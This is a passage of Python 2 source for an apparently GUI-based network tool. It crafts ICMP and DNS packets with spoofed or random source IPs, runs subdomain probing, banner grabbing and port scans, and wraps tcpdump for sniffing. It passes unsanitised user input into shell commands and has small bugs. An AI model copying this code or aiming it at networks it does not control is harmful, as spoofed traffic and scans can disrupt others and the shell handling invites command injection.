        try:
            int(str(type).split("'")[0])
            type = int(str(type).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Type should be an integer! [0 for reserved]")
            ui.msg.show()
            error_ICMP += 1


    code = ui.i_icmpCode.text()
    if code == "":
        code = None
    else:
        try:
            int(str(code).split("'")[0])
            code = int(str(code).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Code should be an integer! [0 for Network Unreachable]")
            ui.msg.show()
            error_ICMP += 1


    seq = ui.i_icmpSeq.text()
    if seq == "":
        seq = 0x0
    else:
        try:
            int(seq,16)
            seq = int(seq,16)
        except ValueError:
            ui.msg.setInformativeText("Given SEQ number can not converted hex, enter an integer!")
            ui.msg.show()
            error_ICMP +=1


    id = ui.i_icmpId.text()
    if id == "":
        id = 0x0
    else:
        try:
            int(id,16)
            seq = int(id,16)
        except ValueError:
            ui.msg.setInformativeText("Given ID number can not converted hex, enter an integer!")
            ui.msg.show()
            error_ICMP +=1

    checksum = ui.i_icmpCheck.text()
    if checksum == "":
        checksum = None
    else:
        try:
            int(checksum, 16)
            checksum = int(checksum, 16)
        except ValueError:
            ui.msg.setInformativeText("Given checksum can not converted hex, enter an integer!")
            ui.msg.show()
            error_ICMP +=1

    destination_IP = ui.i_icmpDestIP.text()
    if destination_IP == "":
        destination_IP = RandomIP()
    else:
        try:
            dstlen_IP = len(str(destination_IP).split("."))
            if dstlen_IP != 4:
                ui.msg.setInformativeText("Given destination IP is invalid!")
                ui.msg.show()
                error_ICMP += 1
        except:
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_ICMP +=1
        try:
            int(str(destination_IP).split(".")[0])
            int(str(destination_IP).split(".")[1])
            int(str(destination_IP).split(".")[2])
            int(str(destination_IP).split(".")[3])
        except:
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_ICMP +=1

    source_IP = ui.i_icmpSrcIP.text()
    if source_IP == "":
        source_IP = RandomIP()
    else:
        try:
            srclen_IP = len(str(source_IP).split("."))
            if srclen_IP != 4:
                ui.msg.setInformativeText("Given source IP is invalid!")
                ui.msg.show()
                error_ICMP += 1
        except:
            ui.msg.setInformativeText("Given source IP is invalid!")
            ui.msg.show()
            error_ICMP +=1
        try:
            int(str(source_IP).split(".")[0])
            int(str(source_IP).split(".")[1])
            int(str(source_IP).split(".")[2])
            int(str(source_IP).split(".")[3])
        except:
            ui.msg.setInformativeText("Given source IP is invalid!")
            ui.msg.show()
            error_ICMP +=1

    if error_ICMP == 0:
        try:
            ICMP_Packet.type = type
            ICMP_Packet.code = code
            ICMP_Packet.chksum = checksum
            ICMP_Packet.id = id
            ICMP_Packet.seq = seq
        except:
            pass

	try:
            send(IP(dst=destination_IP, src=source_IP) / ICMP_Packet, verbose=0)
        except:
            pass

def dns_Send():
    error_DNS = 0
    DNS_Packet = DNS()

    query_ID = ui.idnsQId.text()
    if query_ID == "":
        query_ID = 0
    else:
        try:
            int(str(query_ID).split("'")[0])
            query_ID = int(str(query_ID).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Query ID should be an integer!")
            ui.msg.show()
            error_DNS +=1


    query_Response = ui.idnsQRes.text()
    if query_Response == "":
        query_Response = 0
    else:
        try:
            int(str(query_Response).split("'")[0])
            query_Response = int(str(query_Response).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Query Response should be an integer!")
            ui.msg.show()
            error_DNS +=1


    op_Code = ui.idnsOp.text()
    if op_Code == "":
        op_Code = "QUERY"
    else:
        try:
            int(str(op_Code).split("'")[0])
            op_Code = int(str(op_Code).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("OP Code should be an integer!")
            ui.msg.show()
            error_DNS +=1


    autho_Answer = ui.idnsAutAns.text()
    if autho_Answer == "":
        autho_Answer = 0
    else:
        try:
            int(str(autho_Answer).split("'")[0])
            autho_Answer = int(str(autho_Answer).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Authoritative Answer should be an integer!")
            ui.msg.show()
            error_DNS +=1


    truncated = ui.idnsTrun.text()
    if truncated == "":
        truncated = 1
    else:
        try:
            int(str(truncated).split("'")[0])
            truncated = int(str(truncated).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Truncated number should be an integer!")
            ui.msg.show()
            error_DNS +=1

    recur_Desired = ui.idnsRecDes.text()
    if recur_Desired == "":
        recur_Desired = 0
    else:
        try:
            int(str(recur_Desired).split("'")[0])
            recur_Desired = int(str(recur_Desired).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Recursion Desired number should be an integer!")
            ui.msg.show()
            error_DNS +=1


    recur_Available = ui.idnsRecAv.text()
    if recur_Available == "":
        recur_Available = 0
    else:
        try:
            int(str(recur_Available).split("'")[0])
            recur_Available = int(str(recur_Available).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Recursion Available number should be an integer!")
            ui.msg.show()
            error_DNS +=1


    reserved = ui.idnsRes.text()
    if reserved == "":
        reserved = 0
    else:
        try:
            int(str(reserved).split("'")[0])
            reserved = int(str(reserved).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Reserved number should be an integer!")
            ui.msg.show()
            error_DNS +=1


    response_Code = ui.idnsResCode.text()
    if response_Code == "":
        response_Code = 'ok'
    else:
        try:
            int(str(response_Code).split("'")[0])
            response_Code = int(str(response_Code).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Response Code should be an integer!")
            ui.msg.show()
            error_DNS +=1

    qRecord_Count = ui.idnsQRes.text()
    if qRecord_Count == "":
        qRecord_Count = 1
    else:
        try:
            int(str(qRecord_Count).split("'")[0])
            qRecord_Count = int(str(qRecord_Count).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Question Record Count should be an integer!")
            ui.msg.show()
            error_DNS +=1


    aRecord_Count = ui.idnsAnsRec.text()
    if aRecord_Count == "":
        aRecord_Count = 0
    else:
        try:
            int(str(aRecord_Count).split("'")[0])
            aRecord_Count = int(str(aRecord_Count).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Answer Record Count should be an integer!")
            ui.msg.show()
            error_DNS +=1


    autRecord_Count = ui.idnsAutRec.text()
    if autRecord_Count == "":
        autRecord_Count = 0
    else:
        try:
            int(str(autRecord_Count).split("'")[0])
            autRecord_Count = int(str(autRecord_Count).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Authority Record Count should be an integer!")
            ui.msg.show()
            error_DNS +=1

    addRecord_Count = ui.idnsAddRec.text()
    if addRecord_Count == "":
        addRecord_Count = 0
    else:
        try:
            int(str(addRecord_Count).split("'")[0])
            addRecord_Count = int(str(addRecord_Count).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Additional Record Count should be an integer!")
            ui.msg.show()
            error_DNS +=1


    qd = ui.idnsqd.text()
    if qd == "":
        qd = None
    else:
        try:
            int(str(qd).split("'")[0])
            qd = int(str(qd).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("QD number should be an integer!")
            ui.msg.show()
            error_DNS +=1

    an = ui.idnsan.text()
    if an == "":
        an = None
    else:
        try:
            int(str(an).split("'")[0])
            an = int(str(an).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("AN number should be an integer!")
            ui.msg.show()
            error_DNS +=1


    ns = ui.idnsns.text()
    if ns == "":
        ns = None
    else:
        try:
            int(str(ns).split("'")[0])
            ns = int(str(ns).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("NS number should be an integer!")
            ui.msg.show()
            error_DNS +=1

    ar = ui.idnsar.text()
    if ar == "":
        ar = None
    else:
        try:
            int(str(ar).split("'")[0])
            ar = int(str(ar).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("AR number should be an integer!")
            ui.msg.show()
            error_DNS +=1

    destination_IP = ui.i_dnsDestIP.text()
    if destination_IP == "":
        destination_IP = RandomIP()
    else:
        try:
            dstlen_IP = len(str(destination_IP).split("."))
            if dstlen_IP != 4:
                ui.msg.setInformativeText("Given destination IP is invalid!")
                ui.msg.show()
                error_DNS += 1
        except:
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_DNS +=1
        try:
            int(str(destination_IP).split(".")[0])
            int(str(destination_IP).split(".")[1])
            int(str(destination_IP).split(".")[2])
            int(str(destination_IP).split(".")[3])
        except:
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_DNS +=1

    dns_Server = ui.i_dnsDestIP_2.text()
    if dns_Server == "":
        dns_Server = '8.8.8.8'
    else:
        try:
            srvlen_IP = len(str(dns_Server).split("."))
            if srvlen_IP != 4:
                ui.msg.setInformativeText("Given DNS Server IP is invalid!")
                ui.msg.show()
                error_DNS += 1
        except:
            ui.msg.setInformativeText("Given DNS Server IP is invalid!")
            ui.msg.show()
            error_DNS += 1
        try:
            int(str(dns_Server).split(".")[0])
            int(str(dns_Server).split(".")[1])
            int(str(dns_Server).split(".")[2])
            int(str(dns_Server).split(".")[3])
        except:
            ui.msg.setInformativeText("Given DNS Server IP is invalid!")
            ui.msg.show()
            error_DNS +=1

    try:
        DNS_Packet.id = query_ID
        DNS_Packet.qr = query_Response
        DNS_Packet.opcode = op_Code
        DNS_Packet.aa = autho_Answer
        DNS_Packet.tc = truncated
        DNS_Packet.rd = recur_Desired
        DNS_Packet.ra = recur_Available
        DNS_Packet.z = reserved
        DNS_Packet.rcode = response_Code
        DNS_Packet.qdcount = qRecord_Count
        DNS_Packet.ancount = aRecord_Count
        DNS_Packet.nscount = autRecord_Count
        DNS_Packet.arcount = addRecord_Count
        DNS_Packet.qd = qd
        DNS_Packet.an = an
        DNS_Packet.ns = ns
        DNS_Packet.ar = ar
        DNS_Packet.qd = DNSQR(qname=destination_IP)
    except:
        pass

    try:
        dns_answer = sr1(IP(dst=dns_Server) / UDP(dport=53) / DNS_Packet, verbose=0)
    except:
        pass

class dns_:
    def __init__(self):
        self.DNS_Packet = DNS()
        self.DNS_Packet.id = 0
        self.DNS_Packet.qr = 0
        self.DNS_Packet.opcode = "QUERY"
        self.DNS_Packet.aa = 0
        self.DNS_Packet.tc = 1
        self.DNS_Packet.rd = 0
        self.DNS_Packet.ra = 0
        self.DNS_Packet.z = 0
        self.DNS_Packet.rcode = "ok"
        self.DNS_Packet.qdcount = 1
        self.DNS_Packet.ancount = 0
        self.DNS_Packet.nscount = 0
        self.DNS_Packet.arcount = 0
        self.DNS_Packet.qd = None
        self.DNS_Packet.an = None
        self.DNS_Packet.ns = None
        self.DNS_Packet.ar = None


def recon():
    ui.textEdit.clear()
    if ui.subdomain.isChecked() == True:
        server = ["www", "ns", "ns1", "ns2", "mail", "http", "https", "ftp", "gateway"]
        targetDomain = ui.is_targetIP.text()
        if targetDomain == "":
            ui.msg.setInformativeText("Enter a target domain or IP!")
            ui.msg.show()
        else:
            for i in range(0, len(server)):
                Query = server[i] + "." + targetDomain
                proc_IP = subprocess.Popen(['ping -c 1 -q -W 0.0001 '+ str(Query) + ' | grep -v "unknown host"'], stdout=subprocess.PIPE, shell=True)
                (out, err) = proc_IP.communicate()
                if out != "":
                    ui.textEdit.append(str(Query) + "    --->>>    " +  out.split(" ")[2])
                try:
                    proc_IP.kill()
                except:
                    pass
                try:
                    proc_IP.terminate()
                except:
                    pass


    elif ui.banner.isChecked() == True:
        ui.textEdit.clear()
        import socket
        str_flg = 1
        targetDomain = ui.is_targetIP.text()
        if targetDomain == "":
            ui.msg.setInformativeText("Enter a target domain or IP!")
            ui.msg.show()
        else:
            try:
                int(str(targetDomain).split(".")[1])
                str_flag = 1
            except ValueError:
                try:
                    socket.gethostbyname(targetDomain)
                    targetDomain = socket.gethostbyname(targetDomain)
                    str_flg = 0
                except:
                    pass
            if str_flg == 0:
                try:
                    s = socket.socket()
                    s.settimeout(10)
                    s.connect((targetDomain, 80))
                    s.send(b'GET /\n\n')
                    ui.textEdit.append(s.recv(10000))
                except:
                    ui.textEdit.setText("[ERROR] Target connection failed, try again later!")
            else:
                try:
                    s = socket.socket()
                    s.settimeout(10)
                    s.connect((targetDomain, 80))
                    s.send(b'GET /\n\n')
                    ui.textEdit.append(s.recv(10000))
                except:
                    ui.textEdit.setText("[ERROR] Target connection failed, try again later!")


    elif ui.traceroute.isChecked() == True:
        ui.textEdit.clear()
        import commands,socket
        targetDomain = str(ui.is_targetIP.text())
        if targetDomain == "":
            ui.msg.setInformativeText("Enter a target domain or IP!")
            ui.msg.show()
        else:
            try:
                status, output = commands.getstatusoutput("traceroute " + targetDomain)
                ui.textEdit.setText(output)
            except:
                pass


    elif ui.port.isChecked() == True:
        error_Port = 0
        ui.textEdit.clear()
        import socket
        portEnd = 81
        portStart = 1

        targetDomain = ui.is_targetIP.text()
        portStart = ui.is_port.text()
        portEnd = ui.is_port_2.text()

        if targetDomain == "":
            ui.msg.setInformativeText("Enter a target domain or IP!")
            ui.msg.show()
            error_Port += 1

        else:
            try:
                int(str(targetDomain).split(".")[1])
            except ValueError:
                try:
                    socket.gethostbyname(targetDomain)
                    targetDomain = socket.gethostbyname(targetDomain)
                except:
                    error_Port += 1
            if str(portStart) == "":
                portStart = 1
            else:
                try:
                    int(portStart)
                except ValueError:
                    ui.msg.setInformativeText("Start Port should be an integer!")
                    ui.msg.show()
                    error_Port += 1

            if str(portEnd) == "":
                portEnd = 81
            else:
                try:
                    int(portEnd)
                except ValueError:
                    ui.msg.setInformativeText("End Port should be an integer!")
                    ui.msg.show()
                    error_Port += 1

            if error_Port == 0:
                try:
		    no_Port = 0
                    for x in range(int(portStart), int(portEnd)):
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.05)
                        try:
                            con = s.connect((targetDomain, x))
                            port = True
                        except:
                            port = False
                        if port == True:
			    no_Port += 1
                            ui.textEdit.append('Port ' + str(x) + '-> OPEN')
		    if no_Port == 0:
			ui.textEdit.append('There are not any OPEN ports!')
                except:
                    pass

    else:
        ui.textEdit.clear()
        ui.msg.setInformativeText("Select a scan type!")
        ui.msg.show()

def kill_sniff():
    global processing_Flag
    if processing_Flag == 1:
        ui.m_startB.setText("START")
        ui.m_startB.setStyleSheet("background-color: rgb(0, 0, 112);")
        processing_Flag = 0

        try:
            proc.terminate()
            try:
                proc.kill()
            except:
                pass
            proc2 = subprocess.Popen(['ps -A | grep "tcpdump" | cut -c -6'], stdout=subprocess.PIPE, shell=True)
            (out, err) = proc2.communicate()
            try:
                os.system("kill " + out)
            except:
                pass
            for x in range(0,(len(str(out).split(" "))-1)):
                procs = str(out).split(" ")[x]
                if str(procs) != "":
                    os.system("kill " + str(procs))
            try:
                proc2.kill()
            except:
                pass
            try:
                proc2.terminate()
            except:
                pass
            try:
                t.join(1)
            except:
                pass
        except:
            pass
    else:
        sniffer()


def tail_f():
    try:
        filename = '/tmp/data'
        file = open(filename, 'r')

        st_results = os.stat(filename)
        st_size = st_results[6]
        file.seek(st_size)

        while 1:
            where = file.tell()
            line = file.readline()
            if not line:
                time.sleep(1)
                file.seek(where)
            else:
                ui.textEdit_3.append(line)
    except:
        pass

def Sniff_Control(IP):
    try:
        int(IP.split(".")[0])
        int(IP.split(".")[1])
        int(IP.split(".")[2])
        int(IP.split(".")[3])
    except ValueError:
        ui.msg.setInformativeText("Enter a valid IP")
        ui.msg.show()
        ui.m_startB.setText("START")
        ui.m_startB.setStyleSheet("background-color: rgb(0, 0, 112);")
        global processing_Flag
        processing_Flag = 0
        global IPsrc_Flag
        IPsrc_Flag = 1
        return 1
    return 0

def Sniff_PortControl(Port):
    try:
        int(Port)
    except ValueError:
        ui.msg.setInformativeText("Enter a valid port number")
        ui.msg.show()
        ui.m_startB.setText("START")
        ui.m_startB.setStyleSheet("background-color: rgb(0, 0, 112);")
        global processing_Flag
        processing_Flag = 0
        global Port_Flag
        Port_Flag = 1
        return 1
    return 0

def sniffer():
    global processing_Flag
    if processing_Flag == 0:
        global IPsrc_Flag, IPdst_Flag, Port_Flag

        ui.m_startB.setText("STOP")
        ui.m_startB.setStyleSheet("background-color: rgb(192, 192, 192);")

        multi_packet = ""
        flag = 0
        flag_and = 0
        if ui.m_dhcpbox.isChecked() == True:
            multi_packet = multi_packet + "or port 67 and port 68 "
            flag = 1

        if ui.m_icmpbox.isChecked() == True:
            multi_packet = multi_packet + "or icmp "
            flag = 1

        if ui.m_ipbox.isChecked() == True:
            multi_packet = multi_packet + "or ip "
            flag = 1

        if ui.m_tcpbox.isChecked() == True:
            multi_packet = multi_packet + "or tcp "
            flag = 1

        if ui.m_udpbox.isChecked() == True:
            multi_packet = multi_packet + "or udp "
            flag = 1

        if ui.m_dnsbox.isChecked() == True:
            multi_packet = multi_packet + "or port 53 "
            flag = 1

        if ui.m_arpbox.isChecked() == True:
            multi_packet = multi_packet + "or arp "
            flag = 1

        if ui.im_srcIP.text() == "":
            IPsrc_Flag = 0

        else:
            if Sniff_Control(ui.im_srcIP.text()) == 0:
                multi_packet = multi_packet + "and src " + str(ui.im_srcIP.text()) + " "
                flag_and = 1

        if ui.im_dstIP.text() == "":
            IPdst_Flag = 0
        else:
            if Sniff_Control(ui.im_dstIP.text()) == 0:
                multi_packet = multi_packet + "and dst " + str(ui.im_dstIP.text()) + " "
                flag_and = 1

        if ui.im_port.text() == "":
            Port_Flag = 0
        else:
            if Sniff_PortControl(ui.im_port.text()) == 0:
                multi_packet = multi_packet + "and port " + str(ui.im_port.text()) + " "
                flag_and = 1

        if ui.resolveBox.isChecked() == True:
            multi_packet = multi_packet
	else:
	    multi_packet = multi_packet + "-nn "

        if ui.saveBox.isChecked() == True:
            multi_packet = multi_packet + "-w tcpdump-Output.pcap "

        try:
            if IPsrc_Flag != 0 or IPdst_Flag != 0 or Port_Flag != 0:
                pass
            else:
                if os.path.exists("/tmp/data"):
                    os.system("rm -rf /rmp/data")
                if flag == 0:
                    if flag_and == 0:
                        multi_packet = "tcpdump -l " + multi_packet + " > /tmp/data"
                    else:
                        multi_packet = "tcpdump -l " + multi_packet[4:] + " > /tmp/data"
                else:
                    if flag_and == 1:
                        multi_packet = "tcpdump -l " + multi_packet[3:] + " > /tmp/data"
                    else:
                        multi_packet = "tcpdump -l " + multi_packet[3:] + " > /tmp/data"
                global proc
                proc = subprocess.Popen(multi_packet, shell=True)
                global t
                t = Thread(target=tail_f)
                t.start()
                processing_Flag = 1
        except:
            pass
    else:
        kill_sniff()

def DetectPacket_Header(Pcap, Pcap_Len):
        for pkt in range(1, Pcap_Len):
            for order in range(0, len(Packet_Types)):
                if (Packet_Types[order] == str(Pcap[pkt].show).split(" ")[9][2:]):
                    globals()[str(Packet_Types[order]) + "_Header"](Pcap, pkt)

def DetectPacket_Protocol(Pcap, pkt):
        for protocol_order in range(0, len(Packet_Protocols)):
            if (Packet_Protocols[protocol_order] == str(Pcap[pkt].show).split(" ")[47][2:]):
                globals()[str(Packet_Protocols[protocol_order]) + "_Protocol"](Pcap, pkt)

def DetectTransport_Protocol(Pcap, pkt):
        for transport_order in range(0, len(Transport_Protocols)):
            if (Transport_Protocols[transport_order] == str(Pcap[pkt].show).split(" ")[24][2:]):
                globals()[str(Transport_Protocols[transport_order]) + "_Func"](Pcap, pkt)

def DetectUDP_Services(Pcap, pkt):
        for udp_services in range(0, len(UDP_Services)):
            if (UDP_Services[udp_services] == str(Pcap[pkt].show).split(" ")[26][6:]):
                globals()[str(UDP_Services[udp_services])](Pcap, pkt)

def DetectIPv6_Types(Pcap, pkt):
        for ipv6_types in range(0, len(IPv6_Types)):
            if (IPv6_Types[ipv6_types] == str(Pcap[pkt].show).split(" ")[15][3:]):
                if IPv6_Types[ipv6_types] == "Hop-by-Hop":
                    IPv6_HopbyHop_v6(Pcap, pkt)
                else:
                    globals()[str(IPv6_Types[ipv6_types]) + "_v6"](Pcap, pkt)

def DetectEther_Frame(Pcap, pkt):
        ui.textEdit_2.append("\n[Ether]Destination MAC ="+ str(Pcap[pkt].show).split(" ")[6][4:])
        ui.textEdit_2.append("[Ether]Source MAC ="+ str(Pcap[pkt].show).split(" ")[7][4:])
        ui.textEdit_2.append("[Ether]Type ="+ str(Pcap[pkt].show).split(" ")[8][5:]+ "\n")

def netbios_ns(Pcap, pkt):
        ui.textEdit_2.append("\n[NBNS]Netbios Type ="+ str(Pcap[pkt].show).split(" ")[30][6:])
        ui.textEdit_2.append("[NBNS]Name TRN ID ="+ str(Pcap[pkt].show).split(" ")[32][12:])
        ui.textEdit_2.append("[NBNS]Flags ="+ str(Pcap[pkt].show).split(" ")[33][6:])
        ui.textEdit_2.append("[NBNS]QDCount ="+ str(Pcap[pkt].show).split(" ")[34][8:])
        ui.textEdit_2.append("[NBNS]ANCount ="+ str(Pcap[pkt].show).split(" ")[35][8:])
        ui.textEdit_2.append("[NBNS]NSCount ="+ str(Pcap[pkt].show).split(" ")[36][8:])
        ui.textEdit_2.append("[NBNS]ARCount ="+ str(Pcap[pkt].show).split(" ")[37][8:])
        ui.textEdit_2.append("[NBNS]Question NA ME ="+ str(Pcap[pkt].show).split(" ")[38][14:])
        ui.textEdit_2.append("[NBNS]Suffix ="+ str(Pcap[pkt].show).split(" ")[39][7:])
        ui.textEdit_2.append("[NBNS]Null ="+ str(Pcap[pkt].show).split(" ")[40][5:])
        ui.textEdit_2.append("[NBNS]Question Type ="+ str(Pcap[pkt].show).split(" ")[41][14:])
        ui.textEdit_2.append("[NBNS]Question Class ="+ str(Pcap[pkt].show).split(" ")[42][15:])

def ICMP_Func(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n[ICMP]ICMP-Type ="+ str(Pcap[pkt].show).split(" ")[26][5:])
        ui.textEdit_2.append("[ICMP]Code ="+ str(Pcap[pkt].show).split(" ")[27][5:])
        ui.textEdit_2.append("[ICMP]Checksum ="+ str(Pcap[pkt].show).split(" ")[28][7:])
        ui.textEdit_2.append("[ICMP]ID ="+ str(Pcap[pkt].show).split(" ")[29][3:])
        ui.textEdit_2.append("[ICMP]Seq ="+ str(Pcap[pkt].show).split(" ")[30][4:])

        #IPerror(Pcap, pkt)
        ICMPerror(Pcap, pkt)
    except:
        pass

def IPerror(Pcap, pkt):
        ui.textEdit_2.append("\n[IPerror]Version ="+ str(Pcap[pkt].show).split(" ")[32][8:])
        ui.textEdit_2.append("[IPerror]Internet Header Length (IHL) ="+ str(Pcap[pkt].show).split(" ")[33][4:])
        ui.textEdit_2.append("[IPerror]Type of Service (ToS) ="+ str(Pcap[pkt].show).split(" ")[34][4:])
        ui.textEdit_2.append("[IPerror]Length ="+ str(Pcap[pkt].show).split(" ")[35][4:])
        ui.textEdit_2.append("[IPerror]ID ="+ str(Pcap[pkt].show).split(" ")[36][3:])

        if (str(Pcap[pkt].show).split(" ")[33])[6:] != "":
            ui.textEdit_2.append("[IPerror]Flags ="+ str(Pcap[pkt].show).split(" ")[37][6:])

        ui.textEdit_2.append("[IPerror]Fragment ="+ str(Pcap[pkt].show).split(" ")[38][5:])
        ui.textEdit_2.append("[IPerror]Time to Live (TTL) ="+ str(Pcap[pkt].show).split(" ")[39][4:])
        ui.textEdit_2.append("[IPerror]Protocol ="+ str(Pcap[pkt].show).split(" ")[40][6:])
        ui.textEdit_2.append("[IPerror]Checksum ="+ str(Pcap[pkt].show).split(" ")[41][7:])
        ui.textEdit_2.append("[IPerror]Source IP ="+ str(Pcap[pkt].show).split(" ")[42][4:])
        ui.textEdit_2.append("[IPerror]Destination IP ="+ str(Pcap[pkt].show).split(" ")[43][4:])

def ICMPerror(Pcap, pkt):
        ui.textEdit_2.append("\n[ICMPerror]Type ="+ str(Pcap[pkt].show).split(" ")[47][5:])
        ui.textEdit_2.append("[ICMPerror]Code ="+ str(Pcap[pkt].show).split(" ")[48][5:])
        ui.textEdit_2.append("[ICMPerror]Checksum ="+ str(Pcap[pkt].show).split(" ")[49][7:])
        ui.textEdit_2.append("[ICMPerror]ID ="+ str(Pcap[pkt].show).split(" ")[50][3:])
        ui.textEdit_2.append("[ICMPerror]Sequence ="+ str(Pcap[pkt].show).split(" ")[51][4:])

def bootpc(Pcap, pkt):
        ui.textEdit_2.append("\n[BOOTP]Service ="+ str(Pcap[pkt].show).split(" ")[30][2:])
        ui.textEdit_2.append("[BOOTP]Op Code ="+ str(Pcap[pkt].show).split(" ")[32][3:])
        ui.textEdit_2.append("[BOOTP]Hardware Address Type ="+ str(Pcap[pkt].show).split(" ")[33][6:])
        ui.textEdit_2.append("[BOOTP]Hardware Length ="+ str(Pcap[pkt].show).split(" ")[34][5:])
        ui.textEdit_2.append("[BOOTP]Hops ="+ str(Pcap[pkt].show).split(" ")[35][5:])
        ui.textEdit_2.append("[BOOTP]Transaction Identifier ="+ str(Pcap[pkt].show).split(" ")[36][4:])
        ui.textEdit_2.append("[BOOTP]Seconds ="+ str(Pcap[pkt].show).split(" ")[37][5:])
        ui.textEdit_2.append("[BOOTP]Flags ="+ str(Pcap[pkt].show).split(" ")[38][6:])
        ui.textEdit_2.append("[BOOTP]Client IP Address ="+ str(Pcap[pkt].show).split(" ")[39][7:])
        ui.textEdit_2.append("[BOOTP]Your IP Address ="+ str(Pcap[pkt].show).split(" ")[40][7:])
        ui.textEdit_2.append("[BOOTP]Server IP Address ="+ str(Pcap[pkt].show).split(" ")[41][7:])
        ui.textEdit_2.append("[BOOTP]Gateway IP Address ="+ str(Pcap[pkt].show).split(" ")[42][7:])
        ui.textEdit_2.append("[BOOTP]Client Hardware Address Raw ="+ str(Pcap[pkt].show).split(" ")[43][7:])
        ui.textEdit_2.append("[BOOTP]Server Name Raw ="+ str(Pcap[pkt].show).split(" ")[44][6:])
        ui.textEdit_2.append("[BOOTP]Boot File Name Raw ="+ str(Pcap[pkt].show).split(" ")[45][5:])

    ##        ui.textEdit_2.append( "[BOOTP]Options ="+ str(Pcap[pkt-1:pkt]).split(" ")[46][8:]
def TCPFunc(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n##### Packet[" + str(pkt) + "] #####")
        ui.textEdit_2.append("[TCP]Transport Protocol ="+ str(Pcap[pkt].show).split(" ")[24][2:])
        ui.textEdit_2.append("[TCP]Source Port ="+ str(Pcap[pkt].show).split(" ")[26][6:])
        ui.textEdit_2.append("[TCP]Destination Port ="+ str(Pcap[pkt].show).split(" ")[27][6:])
        ui.textEdit_2.append("[TCP]Sequence Number ="+ str(Pcap[pkt].show).split(" ")[28][4:])
        ui.textEdit_2.append("[TCP]ACK Number ="+ str(Pcap[pkt].show).split(" ")[29][4:])
        ui.textEdit_2.append("[TCP]Data offset ="+ str(Pcap[pkt].show).split(" ")[30][8:])
        ui.textEdit_2.append("[TCP]Reserved ="+ str(Pcap[pkt].show).split(" ")[31][9:])
        ui.textEdit_2.append("[TCP]Flags ="+ str(Pcap[pkt].show).split(" ")[32][6:])
        ui.textEdit_2.append("[TCP]Window Size ="+ str(Pcap[pkt].show).split(" ")[33][7:])
        ui.textEdit_2.append("[TCP]Checksum ="+ str(Pcap[pkt].show).split(" ")[34][7:])
        ui.textEdit_2.append("[TCP]Urgent Pointer ="+ str(Pcap[pkt].show).split(" ")[35][7:])
    ##        ui.textEdit_2.append( "[TCP]Options ="+ str(Pcap[pkt-1:pkt]).split(" ")[35][7:]
    except:
        pass

def bootps(Pcap, pkt):
        ui.textEdit_2.append("\n[BOOTP]Service ="+ str(Pcap[pkt].show).split(" ")[30][2:])
        ui.textEdit_2.append("[BOOTP]Op Code ="+ str(Pcap[pkt].show).split(" ")[32][3:])
        ui.textEdit_2.append("[BOOTP]Hardware Address Type ="+ str(Pcap[pkt].show).split(" ")[33][6:])
        ui.textEdit_2.append("[BOOTP]Hardware Length ="+ str(Pcap[pkt].show).split(" ")[34][5:])
        ui.textEdit_2.append("[BOOTP]Hops ="+ str(Pcap[pkt].show).split(" ")[35][5:])
        ui.textEdit_2.append("[BOOTP]Transaction Identifier ="+ str(Pcap[pkt].show).split(" ")[36][4:])
        ui.textEdit_2.append("[BOOTP]Seconds ="+ str(Pcap[pkt].show).split(" ")[37][5:])
        ui.textEdit_2.append("[BOOTP]Flags ="+ str(Pcap[pkt].show).split(" ")[38][6:])
        ui.textEdit_2.append("[BOOTP]Client IP Address ="+ str(Pcap[pkt].show).split(" ")[39][7:])
        ui.textEdit_2.append("[BOOTP]Your IP Address ="+ str(Pcap[pkt].show).split(" ")[40][7:])
        ui.textEdit_2.append("[BOOTP]Server IP Address ="+ str(Pcap[pkt].show).split(" ")[41][7:])
        ui.textEdit_2.append("[BOOTP]Gateway IP Address ="+ str(Pcap[pkt].show).split(" ")[42][7:])
        ui.textEdit_2.append("[BOOTP]Client Hardware Address Raw ="+ str(Pcap[pkt].show).split(" ")[43][7:])
        ui.textEdit_2.append("[BOOTP]Server Name Raw ="+ str(Pcap[pkt].show).split(" ")[44][6:])
        ui.textEdit_2.append("[BOOTP]Boot File Name Raw ="+ str(Pcap[pkt].show).split(" ")[45][5:])

    ##        ui.textEdit_2.append( "[BOOTP]Options ="+ str(Pcap[pkt-1:pkt]).split(" ")[46][8:]

def IGMP(Pcap, pkt):
        pass

def mdns(Pcap, pkt):
        ui.textEdit_2.append("[MDNS]Raw Data ="+ str(str(Pcap[pkt].show).split(" ")[32][5:]))

def UDP_Func(Pcap, pkt):
    try:
        ui.textEdit_2.append("\n[UDP]Transport Protocol ="+ str(Pcap[pkt].show).split(" ")[24][2:])
        ui.textEdit_2.append("[UDP]Source Port ="+ str(Pcap[pkt].show).split(" ")[26][6:])
        ui.textEdit_2.append("[UDP]Destination Port ="+ str(Pcap[pkt].show).split(" ")[27][6:])
        ui.textEdit_2.append("[UDP]Length ="+ str(Pcap[pkt].show).split(" ")[28][4:])
        ui.textEdit_2.append("[UDP]Checksum ="+ str(Pcap[pkt].show).split(" ")[29][7:])

        DetectUDP_Services(Pcap, pkt)
